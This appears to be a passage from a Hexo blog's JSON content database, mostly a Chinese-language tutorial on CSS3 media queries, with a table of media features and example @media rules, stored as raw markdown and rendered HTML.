rel=\"noopener\">swiftype</a>官网：</p>\n<!-- ![swiftype](/images/swiftype.png) -->\n<p><img src=\"/images/swiftype.png\" class=\"preview\"><br>完成注册后，我们进入到<a href=\"https://app.swiftype.com/engines/blog/overview\" target=\"_blank\" rel=\"noopener\">概览</a>页面，进入到overview页面后，点击<code>Install Swiftype On Your Website</code>，我们会看到如图的两段代码，分别是搜索文本框和脚本，我们可以将文本框放在任何位置自己喜欢的位置，脚本也是如此，这个swiftype并没有任何限制：<br><img src=\"/images/swiftype1.png\" class=\"preview\"></p>\n</li>\n<li><p>当在输入框输入时，会异步搜索文章并显示搜索推荐<br><img src=\"/images/swiftype2.png\" class=\"preview\"><br>点击回车，会弹出一个稍大的窗口<br><img src=\"/images/swiftype3.png\" class=\"preview\"></p>\n</li>\n</ul>\n"},{"id":"0809019","title":"CSS3 多媒体查询","date":"2016-12-05T09:26:49.000Z","_content":"\n<a href=\"#css2\">1. `CSS2` 多媒体类型</a>\n<a href=\"#css3\">2. `CSS3` 多媒体查询</a>\n<a href=\"#browser\">3. 浏览器支持</a>\n<a href=\"#syntax\">4. 语法介绍</a>\n<a href=\"#type\">5. 多媒体类型 `media type`</a>\n<a href=\"#feature\">6. 多媒体功能 `media feature`</a>\n<a href=\"#example\">7. 多媒体查询实例</a>\n\n#### <a name=\"css2\">1、`CSS2` 多媒体类型</a>\n\n- `@media` 规则在 `CSS2` 中有介绍，针对不同媒体类型可以定制不同的样式规则。\n\n- 例如：你可以针对不同的媒体类型(包括显示器、便携设备、电视机，等等)设置不同的样式规则。\n\n- 但是这些多媒体类型`在很多设备上支持还不够友好`。\n\n#### <a name=\"css3\">2、`CSS3` 多媒体查询</a>\nCSS3 的多媒体查询继承了 CSS2 多媒体类型的所有思想： 取代了查找设备的类型，CSS3 根据设置自适应显示。\n\n`媒体查询可用于检测很多事情，例如：`\n\n- viewport(视窗) 的宽度与高度\n- 设备的宽度与高度\n- 朝向 (智能手机横屏，竖屏) 。\n- 分辨率\n\n目前很多针对苹果手机，Android 手机，平板等设备都会使用到多媒体查询。\n\n#### <a name=\"browser\">3、浏览器支持</a>\n\n<img src=\"/images/css3media.gif\">\n\n#### <a name=\"syntax\">4、语法介绍</a>\n\n多媒体查询由多种媒体组成，可以包含一个或多个表达式，表达式根据条件是否成立返回 `true` 或 `false`。\n```css\n@media not|only mediatype and (media feature) {\n  /* CSS 代码...; */\n}\n```\n如果指定的多媒体类型匹配设备类型则查询结果返回 true，文档会在匹配的设备上显示指定样式效果。\n\n除非你使用了 `not` 或 `only` 操作符，否则所有的样式会适应在所有设备上显示效果。\n\n- `not`: not是用来排除掉某些特定的设备的，比如 @media not print（非打印设备）。\n\n- `only`: 用来定某种特别的媒体类型。对于支持Media Queries的移动设备来说，如果存在only关键字，移动设备的Web浏览器会忽略only关键字并直接根据后面的表达式应用样式文件。对于不支持Media Queries的设备但能够读取Media Type类型的Web浏览器，遇到only关键字时会忽略这个样式文件。\n\n- `all`: 所有设备，这个应该经常看到。\n\n你也可以在不同的媒体上使用不同的样式文件：\n```html\n<link rel=\"stylesheet\" media=\"mediatype and|not|only (media feature)\" href=\"mystylesheet.css\">\n```\n\n#### <a name=\"type\">5、多媒体类型 `media type`</a>\n\n| 值 |描述| \n| - | - | \n|all\t    |用于所有多媒体类型设备|\n|print\t  |用于打印机|\n|screen\t  |用于电脑屏幕，平板，智能手机等|\n|speech\t  |用于屏幕阅读器|\n\n#### <a name=\"feature\">6、多媒体功能 `media feature`</a>\n\n| 值| 描述 |\n| - | - |\n|aspect-ratio\t              |定义输出设备中的页面可见区域宽度与高度的比率\n|color\t                    |定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0\n|color-index\t              |定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0\n|device-aspect-ratio\t      |定义输出设备的屏幕可见宽度与高度的比率。\n|device-height\t            |定义输出设备的屏幕可见高度。\n|device-width\t              |定义输出设备的屏幕可见宽度。\n|grid\t                      |用来查询输出设备是否使用栅格或点阵。\n|height\t                    |定义输出设备中的页面可见区域高度。\n|max-aspect-ratio\t          |定义输出设备的屏幕可见宽度与高度的最大比率。\n|max-color\t                |定义输出设备每一组彩色原件的最大个数。\n|max-color-index\t          |定义在输出设备的彩色查询表中的最大条目数。\n|max-device-aspect-ratio\t  |定义输出设备的屏幕可见宽度与高度的最大比率。\n|max-device-height\t        |定义输出设备的屏幕可见的最大高度。\n|max-device-width\t          |定义输出设备的屏幕最大可见宽度。\n|max-height\t                |定义输出设备中的页面最大可见区域高度。\n|max-monochrome\t            |定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。\n|max-resolution\t            |定义设备的最大分辨率。\n|max-width\t                |定义输出设备中的页面最大可见区域宽度。\n|min-aspect-ratio\t          |定义输出设备中的页面可见区域宽度与高度的最小比率。\n|min-color\t                |定义输出设备每一组彩色原件的最小个数。\n|min-color-index\t          |定义在输出设备的彩色查询表中的最小条目数。\n|min-device-aspect-ratio\t  |定义输出设备的屏幕可见宽度与高度的最小比率。\n|min-device-width\t          |定义输出设备的屏幕最小可见宽度。\n|min-device-height\t        |定义输出设备的屏幕的最小可见高度。\n|min-height\t                |定义输出设备中的页面最小可见区域高度。\n|min-monochrome\t            |定义在一个单色框架缓冲区中每像素包含的最小单色原件个数\n|min-resolution\t            |定义设备的最小分辨率。\n|min-width\t                |定义输出设备中的页面最小可见区域宽度。\n|monochrome\t                |定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0\n|orientation\t              |定义输出设备中的页面可见区域高度是否大于或等于宽度。\n|resolution\t                |定义设备的分辨率。如：96dpi, 300dpi, 118dpcm\n|scan\t                      |定义电视类设备的扫描工序。\n|width\t                    |定义输出设备中的页面可见区域宽度。\n\n#### <a name=\"example\">7、多媒体查询实例</a>\n\n```css\n<!-- 当浏览器的宽度在 520px 到 699px, 页面背景为 红色 -->\n@media screen and (max-width: 699px) and (min-width: 520px) {\n    body {\n      background: red;\n    }\n}\n\n<!-- 当浏览器的宽度在 700px 到 1000px, 页面背景为 绿色 -->\n@media screen and (max-width: 1000px) and (min-width: 700px) {\n    body {\n      background: green;\n    }\n}\n\n<!-- 当浏览器的宽度大于 1001px, 页面背景为 蓝色 -->\n@media screen and (min-width: 1001px) {\n    body {\n      background: blue;\n    }\n}\n\n<!-- 当浏览器的宽度在 520px 到 699px 或者大于 1200px 时, 去除body的margin -->\n@media screen and (max-width: 699px) and (min-width: 520px), (min-width: 1200px) {\n    body {\n      margin: 0;\n    }\n}\n```","source":"_posts/0809019_CSS3媒体查询.md","raw":"---\nid: 0809019\ntitle: CSS3 多媒体查询\ndate: 2016-12-05 17:26:49\ntags:\n  - CSS\ncategories:\n---\n\n<a href=\"#css2\">1. `CSS2` 多媒体类型</a>\n<a href=\"#css3\">2. `CSS3` 多媒体查询</a>\n<a href=\"#browser\">3. 浏览器支持</a>\n<a href=\"#syntax\">4. 语法介绍</a>\n<a href=\"#type\">5. 多媒体类型 `media type`</a>\n<a href=\"#feature\">6. 多媒体功能 `media feature`</a>\n<a href=\"#example\">7. 多媒体查询实例</a>\n\n#### <a name=\"css2\">1、`CSS2` 多媒体类型</a>\n\n- `@media` 规则在 `CSS2` 中有介绍，针对不同媒体类型可以定制不同的样式规则。\n\n- 例如：你可以针对不同的媒体类型(包括显示器、便携设备、电视机，等等)设置不同的样式规则。\n\n- 但是这些多媒体类型`在很多设备上支持还不够友好`。\n\n#### <a name=\"css3\">2、`CSS3` 多媒体查询</a>\nCSS3 的多媒体查询继承了 CSS2 多媒体类型的所有思想： 取代了查找设备的类型，CSS3 根据设置自适应显示。\n\n`媒体查询可用于检测很多事情，例如：`\n\n- viewport(视窗) 的宽度与高度\n- 设备的宽度与高度\n- 朝向 (智能手机横屏，竖屏) 。\n- 分辨率\n\n目前很多针对苹果手机，Android 手机，平板等设备都会使用到多媒体查询。\n\n#### <a name=\"browser\">3、浏览器支持</a>\n\n<img src=\"/images/css3media.gif\">\n\n#### <a name=\"syntax\">4、语法介绍</a>\n\n多媒体查询由多种媒体组成，可以包含一个或多个表达式，表达式根据条件是否成立返回 `true` 或 `false`。\n```css\n@media not|only mediatype and (media feature) {\n  /* CSS 代码...; */\n}\n```\n如果指定的多媒体类型匹配设备类型则查询结果返回 true，文档会在匹配的设备上显示指定样式效果。\n\n除非你使用了 `not` 或 `only` 操作符，否则所有的样式会适应在所有设备上显示效果。\n\n- `not`: not是用来排除掉某些特定的设备的，比如 @media not print（非打印设备）。\n\n- `only`: 用来定某种特别的媒体类型。对于支持Media Queries的移动设备来说，如果存在only关键字，移动设备的Web浏览器会忽略only关键字并直接根据后面的表达式应用样式文件。对于不支持Media Queries的设备但能够读取Media Type类型的Web浏览器，遇到only关键字时会忽略这个样式文件。\n\n- `all`: 所有设备，这个应该经常看到。\n\n你也可以在不同的媒体上使用不同的样式文件：\n```html\n<link rel=\"stylesheet\" media=\"mediatype and|not|only (media feature)\" href=\"mystylesheet.css\">\n```\n\n#### <a name=\"type\">5、多媒体类型 `media type`</a>\n\n| 值 |描述| \n| - | - | \n|all\t    |用于所有多媒体类型设备|\n|print\t  |用于打印机|\n|screen\t  |用于电脑屏幕，平板，智能手机等|\n|speech\t  |用于屏幕阅读器|\n\n#### <a name=\"feature\">6、多媒体功能 `media feature`</a>\n\n| 值| 描述 |\n| - | - |\n|aspect-ratio\t              |定义输出设备中的页面可见区域宽度与高度的比率\n|color\t                    |定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0\n|color-index\t              |定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0\n|device-aspect-ratio\t      |定义输出设备的屏幕可见宽度与高度的比率。\n|device-height\t            |定义输出设备的屏幕可见高度。\n|device-width\t              |定义输出设备的屏幕可见宽度。\n|grid\t                      |用来查询输出设备是否使用栅格或点阵。\n|height\t                    |定义输出设备中的页面可见区域高度。\n|max-aspect-ratio\t          |定义输出设备的屏幕可见宽度与高度的最大比率。\n|max-color\t                |定义输出设备每一组彩色原件的最大个数。\n|max-color-index\t          |定义在输出设备的彩色查询表中的最大条目数。\n|max-device-aspect-ratio\t  |定义输出设备的屏幕可见宽度与高度的最大比率。\n|max-device-height\t        |定义输出设备的屏幕可见的最大高度。\n|max-device-width\t          |定义输出设备的屏幕最大可见宽度。\n|max-height\t                |定义输出设备中的页面最大可见区域高度。\n|max-monochrome\t            |定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。\n|max-resolution\t            |定义设备的最大分辨率。\n|max-width\t                |定义输出设备中的页面最大可见区域宽度。\n|min-aspect-ratio\t          |定义输出设备中的页面可见区域宽度与高度的最小比率。\n|min-color\t                |定义输出设备每一组彩色原件的最小个数。\n|min-color-index\t          |定义在输出设备的彩色查询表中的最小条目数。\n|min-device-aspect-ratio\t  |定义输出设备的屏幕可见宽度与高度的最小比率。\n|min-device-width\t          |定义输出设备的屏幕最小可见宽度。\n|min-device-height\t        |定义输出设备的屏幕的最小可见高度。\n|min-height\t                |定义输出设备中的页面最小可见区域高度。\n|min-monochrome\t            |定义在一个单色框架缓冲区中每像素包含的最小单色原件个数\n|min-resolution\t            |定义设备的最小分辨率。\n|min-width\t                |定义输出设备中的页面最小可见区域宽度。\n|monochrome\t                |定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0\n|orientation\t              |定义输出设备中的页面可见区域高度是否大于或等于宽度。\n|resolution\t                |定义设备的分辨率。如：96dpi, 300dpi, 118dpcm\n|scan\t                      |定义电视类设备的扫描工序。\n|width\t                    |定义输出设备中的页面可见区域宽度。\n\n#### <a name=\"example\">7、多媒体查询实例</a>\n\n```css\n<!-- 当浏览器的宽度在 520px 到 699px, 页面背景为 红色 -->\n@media screen and (max-width: 699px) and (min-width: 520px) {\n    body {\n      background: red;\n    }\n}\n\n<!-- 当浏览器的宽度在 700px 到 1000px, 页面背景为 绿色 -->\n@media screen and (max-width: 1000px) and (min-width: 700px) {\n    body {\n      background: green;\n    }\n}\n\n<!-- 当浏览器的宽度大于 1001px, 页面背景为 蓝色 -->\n@media screen and (min-width: 1001px) {\n    body {\n      background: blue;\n    }\n}\n\n<!-- 当浏览器的宽度在 520px 到 699px 或者大于 1200px 时, 去除body的margin -->\n@media screen and (max-width: 699px) and (min-width: 520px), (min-width: 1200px) {\n    body {\n      margin: 0;\n    }\n}\n```","slug":"0809019_CSS3媒体查询","published":1,"updated":"2018-03-27T03:31:33.077Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvu4000ss4c0t1n61o19","content":"<p><a href=\"#css2\">1. <code>CSS2</code> 多媒体类型</a><br><a href=\"#css3\">2. <code>CSS3</code> 多媒体查询</a><br><a href=\"#browser\">3. 浏览器支持</a><br><a href=\"#syntax\">4. 语法介绍</a><br><a href=\"#type\">5. 多媒体类型 <code>media type</code></a><br><a href=\"#feature\">6. 多媒体功能 <code>media feature</code></a><br><a href=\"#example\">7. 多媒体查询实例</a></p>\n<h4 id=\"1、CSS2-多媒体类型\"><a href=\"#1、CSS2-多媒体类型\" class=\"headerlink\" title=\"1、CSS2 多媒体类型\"></a><a name=\"css2\">1、<code>CSS2</code> 多媒体类型</a></h4><ul>\n<li><p><code>@media</code> 规则在 <code>CSS2</code> 中有介绍，针对不同媒体类型可以定制不同的样式规则。</p>\n</li>\n<li><p>例如：你可以针对不同的媒体类型(包括显示器、便携设备、电视机，等等)设置不同的样式规则。</p>\n</li>\n<li><p>但是这些多媒体类型<code>在很多设备上支持还不够友好</code>。</p>\n</li>\n</ul>\n<h4 id=\"2、CSS3-多媒体查询\"><a href=\"#2、CSS3-多媒体查询\" class=\"headerlink\" title=\"2、CSS3 多媒体查询\"></a><a name=\"css3\">2、<code>CSS3</code> 多媒体查询</a></h4><p>CSS3 的多媒体查询继承了 CSS2 多媒体类型的所有思想： 取代了查找设备的类型，CSS3 根据设置自适应显示。</p>\n<p><code>媒体查询可用于检测很多事情，例如：</code></p>\n<ul>\n<li>viewport(视窗) 的宽度与高度</li>\n<li>设备的宽度与高度</li>\n<li>朝向 (智能手机横屏，竖屏) 。</li>\n<li>分辨率</li>\n</ul>\n<p>目前很多针对苹果手机，Android 手机，平板等设备都会使用到多媒体查询。</p>\n<h4 id=\"3、浏览器支持\"><a href=\"#3、浏览器支持\" class=\"headerlink\" title=\"3、浏览器支持\"></a><a name=\"browser\">3、浏览器支持</a></h4><p><img src=\"/images/css3media.gif\"></p>\n<h4 id=\"4、语法介绍\"><a href=\"#4、语法介绍\" class=\"headerlink\" title=\"4、语法介绍\"></a><a name=\"syntax\">4、语法介绍</a></h4><p>多媒体查询由多种媒体组成，可以包含一个或多个表达式，表达式根据条件是否成立返回 <code>true</code> 或 <code>false</code>。<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">media</span> not|only mediatype and (media feature) &#123;</span><br><span class=\"line\">  <span class=\"comment\">/* CSS 代码...; */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果指定的多媒体类型匹配设备类型则查询结果返回 true，文档会在匹配的设备上显示指定样式效果。</p>\n<p>除非你使用了 <code>not</code> 或 <code>only</code> 操作符，否则所有的样式会适应在所有设备上显示效果。</p>\n<ul>\n<li><p><code>not</code>: not是用来排除掉某些特定的设备的，比如 @media not print（非打印设备）。</p>\n</li>\n<li><p><code>only</code>: 用来定某种特别的媒体类型。对于支持Media Queries的移动设备来说，如果存在only关键字，移动设备的Web浏览器会忽略only关键字并直接根据后面的表达式应用样式文件。对于不支持Media Queries的设备但能够读取Media Type类型的Web浏览器，遇到only关键字时会忽略这个样式文件。</p>\n</li>\n<li><p><code>all</code>: 所有设备，这个应该经常看到。</p>\n</li>\n</ul>\n<p>你也可以在不同的媒体上使用不同的样式文件：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"mediatype and|not|only (media feature)\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"mystylesheet.css\"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"5、多媒体类型-media-type\"><a href=\"#5、多媒体类型-media-type\" class=\"headerlink\" title=\"5、多媒体类型 media type\"></a><a name=\"type\">5、多媒体类型 <code>media type</code></a></h4><table>\n<thead>\n<tr>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>all</td>\n<td>用于所有多媒体类型设备</td>\n</tr>\n<tr>\n<td>print</td>\n<td>用于打印机</td>\n</tr>\n<tr>\n<td>screen</td>\n<td>用于电脑屏幕，平板，智能手机等</td>\n</tr>\n<tr>\n<td>speech</td>\n<td>用于屏幕阅读器</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"6、多媒体功能-media-feature\"><a href=\"#6、多媒体功能-media-feature\" class=\"headerlink\" title=\"6、多媒体功能 media feature\"></a><a name=\"feature\">6、多媒体功能 <code>media feature</code></a></h4><table>\n<thead>\n<tr>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>aspect-ratio</td>\n<td>定义输出设备中的页面可见区域宽度与高度的比率</td>\n</tr>\n<tr>\n<td>color</td>\n<td>定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0</td>\n</tr>\n<tr>\n<td>color-index</td>\n<td>定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0</td>\n</tr>\n<tr>\n<td>device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的比率。</td>\n</tr>\n<tr>\n<td>device-height</td>\n<td>定义输出设备的屏幕可见高度。</td>\n</tr>\n<tr>\n<td>device-width</td>\n<td>定义输出设备的屏幕可见宽度。</td>\n</tr>\n<tr>\n<td>grid</td>\n<td>用来查询输出设备是否使用栅格或点阵。</td>\n</tr>\n<tr>\n<td>height</td>\n<td>定义输出设备中的页面可见区域高度。</td>\n</tr>\n<tr>\n<td>max-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>\n</tr>\n<tr>\n<td>max-color</td>\n<td>定义输出设备每一组彩色原件的最大个数。</td>\n</tr>\n<tr>\n<td>max-color-index</td>\n<td>定义在输出设备的彩色查询表中的最大条目数。</td>\n</tr>\n<tr>\n<td>max-device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>\n</tr>\n<tr>\n<td>max-device-height</td>\n<td>定义输出设备的屏幕可见的最大高度。</td>\n</tr>\n<tr>\n<td>max-device-width</td>\n<td>定义输出设备的屏幕最大可见宽度。</td>\n</tr>\n<tr>\n<td>max-height</td>\n<td>定义输出设备中的页面最大可见区域高度。</td>\n</tr>\n<tr>\n<td>max-monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。</td>\n</tr>\n<tr>\n<td>max-resolution</td>\n<td>定义设备的最大分辨率。</td>\n</tr>\n<tr>\n<td>max-width</td>\n<td>定义输出设备中的页面最大可见区域宽度。</td>\n</tr>\n<tr>\n<td>min-aspect-ratio</td>\n<td>定义输出设备中的页面可见区域宽度与高度的最小比率。</td>\n</tr>\n<tr>\n<td>min-color</td>\n<td>定义输出设备每一组彩色原件的最小个数。</td>\n</tr>\n<tr>\n<td>min-color-index</td>\n<td>定义在输出设备的彩色查询表中的最小条目数。</td>\n</tr>\n<tr>\n<td>min-device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最小比率。</td>\n</tr>\n<tr>\n<td>min-device-width</td>\n<td>定义输出设备的屏幕最小可见宽度。</td>\n</tr>\n<tr>\n<td>min-device-height</td>\n<td>定义输出设备的屏幕的最小可见高度。</td>\n</tr>\n<tr>\n<td>min-height</td>\n<td>定义输出设备中的页面最小可见区域高度。</td>\n</tr>\n<tr>\n<td>min-monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的最小单色原件个数</td>\n</tr>\n<tr>\n<td>min-resolution</td>\n<td>定义设备的最小分辨率。</td>\n</tr>\n<tr>\n<td>min-width</td>\n<td>定义输出设备中的页面最小可见区域宽度。</td>\n</tr>\n<tr>\n<td>monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0</td>\n</tr>\n<tr>\n<td>orientation</td>\n<td>定义输出设备中的页面可见区域高度是否大于或等于宽度。</td>\n</tr>\n<tr>\n<td>resolution</td>\n<td>定义设备的分辨率。如：96dpi, 300dpi, 118dpcm</td>\n</tr>\n<tr>\n<td>scan</td>\n<td>定义电视类设备的扫描工序。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>定义输出设备中的页面可见区域宽度。</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"7、多媒体查询实例\"><a href=\"#7、多媒体查询实例\" class=\"headerlink\" title=\"7、多媒体查询实例\"></a><a name=\"example\">7、多媒体查询实例</a></h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!<span class=\"selector-tag\">--</span> 当浏览器的宽度在 520<span class=\"selector-tag\">px</span> 到 699<span class=\"selector-tag\">px</span>, 页面背景为 红色 <span class=\"selector-tag\">--</span>&gt;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">699px</span>) and (min-width: <span class=\"number\">520px</span>) &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!<span class=\"selector-tag\">--</span> 当浏览器的宽度在 700<span class=\"selector-tag\">px</span> 到 1000<span class=\"selector-tag\">px</span>, 页面背景为 绿色 <span class=\"selector-tag\">--</span>&gt;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">1000px</span>) and (min-width: <span class=\"number\">700px</span>) &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!<span class=\"selector-tag\">--</span> 当浏览器的宽度大于 1001<span class=\"selector-tag\">px</span>, 页面背景为 蓝色 <span class=\"selector-tag\">--</span>&gt;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (min-width: <span class=\"number\">1001px</span>) &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!<span class=\"selector-tag\">--</span> 当浏览器的宽度在 520<span class=\"selector-tag\">px</span> 到 699<span class=\"selector-tag\">px</span> 或者大于 1200<span class=\"selector-tag\">px</span> 时, 去除<span class=\"selector-tag\">body</span>的<span class=\"selector-tag\">margin</span> <span class=\"selector-tag\">--</span>&gt;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">699px</span>) and (min-width: <span class=\"number\">520px</span>), (min-width: <span class=\"number\">1200px</span>) &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p><a href=\"#css2\">1. <code>CSS2</code> 多媒体类型</a><br><a href=\"#css3\">2. <code>CSS3</code> 多媒体查询</a><br><a href=\"#browser\">3. 浏览器支持</a><br><a href=\"#syntax\">4. 语法介绍</a><br><a href=\"#type\">5. 多媒体类型 <code>media type</code></a><br><a href=\"#feature\">6. 多媒体功能 <code>media feature</code></a><br><a href=\"#example\">7. 多媒体查询实例</a></p>\n<h4 id=\"1、CSS2-多媒体类型\"><a href=\"#1、CSS2-多媒体类型\" class=\"headerlink\" title=\"1、CSS2 多媒体类型\"></a><a name=\"css2\">1、<code>CSS2</code> 多媒体类型</a></h4><ul>\n<li><p><code>@media</code> 规则在 <code>CSS2</code> 中有介绍，针对不同媒体类型可以定制不同的样式规则。</p>\n</li>\n<li><p>例如：你可以针对不同的媒体类型(包括显示器、便携设备、电视机，等等)设置不同的样式规则。</p>\n</li>\n<li><p>但是这些多媒体类型<code>在很多设备上支持还不够友好</code>。</p>\n</li>\n</ul>\n<h4 id=\"2、CSS3-多媒体查询\"><a href=\"#2、CSS3-多媒体查询\" class=\"headerlink\" title=\"2、CSS3 多媒体查询\"></a><a name=\"css3\">2、<code>CSS3</code> 多媒体查询</a></h4><p>CSS3 的多媒体查询继承了 CSS2 多媒体类型的所有思想： 取代了查找设备的类型，CSS3 根据设置自适应显示。</p>\n<p><code>媒体查询可用于检测很多事情，例如：</code></p>\n<ul>\n<li>viewport(视窗) 的宽度与高度</li>\n<li>设备的宽度与高度</li>\n<li>朝向 (智能手机横屏，竖屏) 。</li>\n<li>分辨率</li>\n</ul>\n<p>目前很多针对苹果手机，Android 手机，平板等设备都会使用到多媒体查询。</p>\n<h4 id=\"3、浏览器支持\"><a href=\"#3、浏览器支持\" class=\"headerlink\" title=\"3、浏览器支持\"></a><a name=\"browser\">3、浏览器支持</a></h4><p><img src=\"/images/css3media.gif\"></p>\n<h4 id=\"4、语法介绍\"><a href=\"#4、语法介绍\" class=\"headerlink\" title=\"4、语法介绍\"></a><a name=\"syntax\">4、语法介绍</a></h4><p>多媒体查询由多种媒体组成，可以包含一个或多个表达式，表达式根据条件是否成立返回 <code>true</code> 或 <code>false</code>。<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">media</span> not|only mediatype and (media feature) &#123;</span><br><span class=\"line\">  <span class=\"comment\">/* CSS 代码...; */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果指定的多媒体类型匹配设备类型则查询结果返回 true，文档会在匹配的设备上显示指定样式效果。</p>\n<p>除非你使用了 <code>not</code> 或 <code>only</code> 操作符，否则所有的样式会适应在所有设备上显示效果。</p>\n<ul>\n<li><p><code>not</code>: not是用来排除掉某些特定的设备的，比如 @media not print（非打印设备）。</p>\n</li>\n<li><p><code>only</code>: 用来定某种特别的媒体类型。对于支持Media Queries的移动设备来说，如果存在only关键字，移动设备的Web浏览器会忽略only关键字并直接根据后面的表达式应用样式文件。对于不支持Media Queries的设备但能够读取Media Type类型的Web浏览器，遇到only关键字时会忽略这个样式文件。</p>\n</li>\n<li><p><code>all</code>: 所有设备，这个应该经常看到。</p>\n</li>\n</ul>\n<p>你也可以在不同的媒体上使用不同的样式文件：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"mediatype and|not|only (media feature)\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"mystylesheet.css\"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"5、多媒体类型-media-type\"><a href=\"#5、多媒体类型-media-type\" class=\"headerlink\" title=\"5、多媒体类型 media type\"></a><a name=\"type\">5、多媒体类型 <code>media type</code></a></h4><table>\n<thead>\n<tr>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>all</td>\n<td>用于所有多媒体类型设备</td>\n</tr>\n<tr>\n<td>print</td>\n<td>用于打印机</td>\n</tr>\n<tr>\n<td>screen</td>\n<td>用于电脑屏幕，平板，智能手机等</td>\n</tr>\n<tr>\n<td>speech</td>\n<td>用于屏幕阅读器</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"6、多媒体功能-media-feature\"><a href=\"#6、多媒体功能-media-feature\" class=\"headerlink\" title=\"6、多媒体功能 media feature\"></a><a name=\"feature\">6、多媒体功能 <code>media 